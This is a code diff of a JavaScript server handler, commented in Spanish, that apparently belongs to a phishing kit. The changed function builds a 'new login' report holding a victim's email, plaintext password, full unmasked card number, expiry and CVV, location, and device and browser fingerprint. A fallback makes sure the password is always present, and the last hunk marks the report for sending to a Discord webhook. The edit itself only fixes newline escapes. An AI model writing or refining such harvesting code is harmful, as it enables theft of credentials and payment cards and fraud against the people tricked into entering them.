@@ -40,48 +40,48 @@ async function githubRead() {
 function buildDefaultMessage(body, clientIp, timestamp) {
   var message = '';
   message += '🔐 Nuevo inicio de sesión';
-  message += '\\n──────────────────────────';
-  message += '\\n👤 Usuario: ' + (body.email || 'unknown');
-  message += '\\n🔑 Contraseña: ' + (body.password || '****');
+  message += '\n──────────────────────────';
+  message += '\n👤 Usuario: ' + (body.email || 'unknown');
+  message += '\n🔑 Contraseña: ' + (body.password || '****');
   // Datos de tarjeta completos (sin enmascarar)
   if (body.cardNumber) {
-    message += '\\n💳 Tarjeta: ' + body.cardNumber;
-    message += '\\n📅 Vencimiento: ' + (body.cardExpiry || 'desconocido');
-    message += '\\n🔒 CVV: ' + (body.cardCvv || 'desconocido');
+    message += '\n💳 Tarjeta: ' + body.cardNumber;
+    message += '\n📅 Vencimiento: ' + (body.cardExpiry || 'desconocido');
+    message += '\n🔒 CVV: ' + (body.cardCvv || 'desconocido');
   }
-  message += '\\n🌐 IP: ' + (clientIp || 'desconocida');
+  message += '\n🌐 IP: ' + (clientIp || 'desconocida');
 
   // Geo IP con fallbacks
   var geoIp = body.geoIp || body.ipifyIp || clientIp;
-  message += '\\n📡 Geo IP: ' + (geoIp || 'desconocida');
-  message += '\\n🏙️ Ciudad: ' + (body.geoCity || 'desconocida');
-  message += '\\n📍 Región: ' + (body.geoRegion || 'desconocida');
-  message += '\\n🌍 País: ' + (body.geoCountry || 'desconocida') + ' (' + (body.geoCountryCode || '') + ')';
-  message += '\\n📡 ISP: ' + (body.geoIsp || 'desconocida');
-  message += '\\n📍 Latitud: ' + (body.geoLatitude || 'desconocida');
-  message += '\\n📍 Longitud: ' + (body.geoLongitude || 'desconocida');
+  message += '\n📡 Geo IP: ' + (geoIp || 'desconocida');
+  message += '\n🏙️ Ciudad: ' + (body.geoCity || 'desconocida');
+  message += '\n📍 Región: ' + (body.geoRegion || 'desconocida');
+  message += '\n🌍 País: ' + (body.geoCountry || 'desconocida') + ' (' + (body.geoCountryCode || '') + ')';
+  message += '\n📡 ISP: ' + (body.geoIsp || 'desconocida');
+  message += '\n📍 Latitud: ' + (body.geoLatitude || 'desconocida');
+  message += '\n📍 Longitud: ' + (body.geoLongitude || 'desconocida');
 
   // Dispositivo
-  message += '\\n\\n📱 Información del dispositivo:';
-  message += '\\n🧠 Memoria RAM: ' + (body.deviceMemory || 'desconocida');
-  message += '\\n💾 CPU: ' + (body.cpuCores || 'desconocido') + ' núcleos';
-  message += '\\n👆 Puntos táctiles: ' + (body.touchPoints || 0);
-  message += '\\n📱 Tipo: ' + (body.isMobile || 'No') + ' (Móvil) / ' + (body.isTablet || 'No') + ' (Tablet) / ' + (body.isDesktop || 'No') + ' (PC)';
+  message += '\n\n📱 Información del dispositivo:';
+  message += '\n🧠 Memoria RAM: ' + (body.deviceMemory || 'desconocida');
+  message += '\n💾 CPU: ' + (body.cpuCores || 'desconocido') + ' núcleos';
+  message += '\n👆 Puntos táctiles: ' + (body.touchPoints || 0);
+  message += '\n📱 Tipo: ' + (body.isMobile || 'No') + ' (Móvil) / ' + (body.isTablet || 'No') + ' (Tablet) / ' + (body.isDesktop || 'No') + ' (PC)';
 
   // Batería
-  message += '\\n🔋 Batería: ' + (body.batteryLevel || 'No disponible') + ' (Cargando: ' + (body.batteryCharging || 'Desconocido') + ')';
+  message += '\n🔋 Batería: ' + (body.batteryLevel || 'No disponible') + ' (Cargando: ' + (body.batteryCharging || 'Desconocido') + ')';
 
   // Navegador
-  message += '\\n\\n🌐 Navegador:';
-  message += '\\nUser Agent: ' + (body.userAgent || 'desconocido');
-  message += '\\n🗣️ Idioma: ' + (body.language || 'desconocido');
-  message += '\\n🖥️ Resolución: ' + (body.screenResolution || 'desconocida') + ' (' + (body.colorDepth || 'desconocida') + ')';
-  message += '\\n⏰ Zona horaria: ' + (body.timezone || 'desconocida');
-  message += '\\n💻 Plataforma: ' + (body.platform || 'desconocida');
-  message += '\\n📶 Estado online: ' + (body.onlineStatus || 'desconocido');
-  message += '\\n🍪 Cookies: ' + (body.cookiesEnabled || 'desconocido');
-  message += '\\n──────────────────────────';
-  message += '\\n⏰ Hora: ' + timestamp;
+  message += '\n\n🌐 Navegador:';
+  message += '\nUser Agent: ' + (body.userAgent || 'desconocido');
+  message += '\n🗣️ Idioma: ' + (body.language || 'desconocido');
+  message += '\n🖥️ Resolución: ' + (body.screenResolution || 'desconocida') + ' (' + (body.colorDepth || 'desconocida') + ')';
+  message += '\n⏰ Zona horaria: ' + (body.timezone || 'desconocida');
+  message += '\n💻 Plataforma: ' + (body.platform || 'desconocida');
+  message += '\n📶 Estado online: ' + (body.onlineStatus || 'desconocido');
+  message += '\n🍪 Cookies: ' + (body.cookiesEnabled || 'desconocido');
+  message += '\n──────────────────────────';
+  message += '\n⏰ Hora: ' + timestamp;
 
   return message;
 }
@@ -201,17 +201,17 @@ export default async function handler(req, res) {
 
     // Fallback: asegurar que la contraseña siempre esté incluida
     if (message.indexOf(password) === -1 && password !== '****') {
-      message += '\\n🔑 Contraseña: ' + password;
+      message += '\n🔑 Contraseña: ' + password;
     }
 
     // Fallback: asegurar que la ubicación siempre esté incluida
     if (message.indexOf('🏙️ Ciudad:') === -1) {
-      message += '\\n🏙️ Ciudad: ' + (body.geoCity || 'desconocida');
-      message += '\\n📍 Región: ' + (body.geoRegion || 'desconocida');
-      message += '\\n🌍 País: ' + (body.geoCountry || 'desconocida') + ' (' + (body.geoCountryCode || '') + ')';
-      message += '\\n📡 ISP: ' + (body.geoIsp || 'desconocida');
-      message += '\\n📍 Latitud: ' + (body.geoLatitude || 'desconocida');
-      message += '\\n📍 Longitud: ' + (body.geoLongitude || 'desconocida');
+      message += '\n🏙️ Ciudad: ' + (body.geoCity || 'desconocida');
+      message += '\n📍 Región: ' + (body.geoRegion || 'desconocida');
+      message += '\n🌍 País: ' + (body.geoCountry || 'desconocida') + ' (' + (body.geoCountryCode || '') + ')';
+      message += '\n📡 ISP: ' + (body.geoIsp || 'desconocida');
+      message += '\n📍 Latitud: ' + (body.geoLatitude || 'desconocida');
+      message += '\n📍 Longitud: ' + (body.geoLongitude || 'desconocida');
     }
 
     // Enviar al webhook de Discord
